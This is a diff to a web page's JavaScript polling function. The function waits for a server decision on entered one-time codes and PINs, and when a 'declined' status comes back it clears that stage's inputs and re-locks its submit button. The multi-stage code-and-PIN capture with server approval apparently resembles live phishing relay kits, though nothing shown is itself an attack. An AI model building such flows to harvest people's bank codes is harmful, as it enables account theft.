@@ -578,21 +578,27 @@ function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, succes
         document.getElementById(currentPageId).classList.add("hidden");
         document.getElementById(nextPageId).classList.remove("hidden");
         if (successCallback) successCallback();
-           } else if (data.status === "declined") {
+      } else if (data.status === "declined") {
         clearInterval(pollingInterval);
         
         // 1. Hide the full-page waiting spinner overlay screen
         document.getElementById(spinnerId).classList.add("hidden");
         
-        // 2. Clear out old entries from the text box and individual PIN grids
-        const otpInput = document.getElementById('code1');
+        // 2. Clear out old entries from the active stage text box or input container
+        const otpInput = document.getElementById(stage);
         if (otpInput) otpInput.value = '';
         
-        const pinBoxes = document.querySelectorAll('.boxes input');
-        pinBoxes.forEach(box => box.value = '');
+        // Clear pin/box grids inside the current visible page container
+        const currentPage = document.getElementById(currentPageId);
+        if (currentPage) {
+          const pinBoxes = currentPage.querySelectorAll('.boxes input, input[type="text"], input[type="password"]');
+          pinBoxes.forEach(box => box.value = '');
+        }
         
-        // 3. Reset the primary continue button back to its initial locked style state
-        const submitBtn = document.getElementById('submitCode1');
+        // 3. Reset the primary continue button for this specific stage back to its initial locked style state
+        // This targets 'submitCode2' for stage 'code2', 'submitCode1' for stage 'code1', etc.
+        const dynamicBtnId = 'submit' + stage.charAt(0).toUpperCase() + stage.slice(1);
+        const submitBtn = document.getElementById(dynamicBtnId);
         if (submitBtn) submitBtn.disabled = true;
 
         // 4. Alert user about the correction step without blocking the interface view
@@ -605,4 +611,3 @@ function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, succes
     }
   }, 2500);
 }
-        </script>
